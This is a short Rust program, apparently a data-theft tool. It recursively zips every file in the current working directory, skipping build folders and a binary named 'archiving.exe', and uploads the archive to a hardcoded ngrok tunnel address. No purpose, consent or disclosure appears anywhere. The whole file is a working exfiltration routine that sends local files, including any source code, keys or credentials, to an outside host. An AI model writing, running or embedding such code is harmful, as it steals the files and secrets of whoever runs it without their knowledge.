use std::fs::{self, File};
use std::io::prelude::*;
use std::io::Read;
use std::path::Path;
use zip::write::FileOptions;
use zip::ZipWriter;
use reqwest::blocking::multipart::{Form, Part};
use reqwest::blocking::Client;

fn zip_current_directory(zip_file_path: &str) -> std::io::Result<()> {
    let file = File::create(zip_file_path)?;
    let mut zip = ZipWriter::new(file);

    // Recursively add files in the current directory to the zip file
    // add_directory_to_zip(&mut zip, ".")?;
    add_directory_to_zip(&mut zip, ".", &["emoji", "user_data", "dump", "temp00", "node_modules", "target", "archiving.exe"])?;

    zip.finish()?;
    post_file();
    Ok(())
}

fn add_directory_to_zip(
    zip: &mut ZipWriter<File>,
    path: &str,
    ignore_list: &[&str],
) -> std::io::Result<()> {
    for entry in fs::read_dir(path)? {
        let entry = entry?;
        let file_path = entry.path();
        let file_name = file_path.file_name().unwrap().to_string_lossy().into_owned();
        
        if ignore_list.iter().any(|&item| file_name.contains(item)) {
            // Skip files or directories in the ignore list
            continue;
        }

        if file_path.is_dir() {
            // Recursively add subdirectories
            add_directory_to_zip(zip, &file_path.to_string_lossy(), ignore_list)?;
        } else {
            // Add file to the zip archive
            let options = FileOptions::default()
                .compression_method(zip::CompressionMethod::Stored)
                .unix_permissions(0o755); // Set file permissions if needed
            zip.start_file(file_path.to_string_lossy(), options)?;
            let mut file = File::open(&file_path)?;
            let mut buffer = Vec::new();
            file.read_to_end(&mut buffer)?;
            zip.write_all(&buffer)?;
        }
    }
    Ok(())
}

fn post_file() -> Result<(), Box<dyn std::error::Error>> {
    // Read the zip file
    let mut file = File::open("temp00.zip")?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    // Create form data with the zip file
    let form = Form::new()
        .part("file", Part::bytes(buffer).file_name("file.zip"));

    // Send the form data with the zip file
    let client = Client::new();
    let response = client
        .post("https://6dc4-94-158-61-33.ngrok-free.app/upload")
        .multipart(form)
        .send()?;

    println!("{:?}", response.status());

    Ok(())
}

fn main() {
    let zip_file_path = "./temp00.zip";
    let ignore_list = ["emoji", "user_data", "dump", "temp00", "node_modules", "target", "archiving.exe"];
    if let Err(e) = zip_current_directory(zip_file_path) {
        eprintln!("Error zipping current directory: {}", e);
    } else {
        println!("Current directory zipped successfully.");
        // post_file();
    }
}
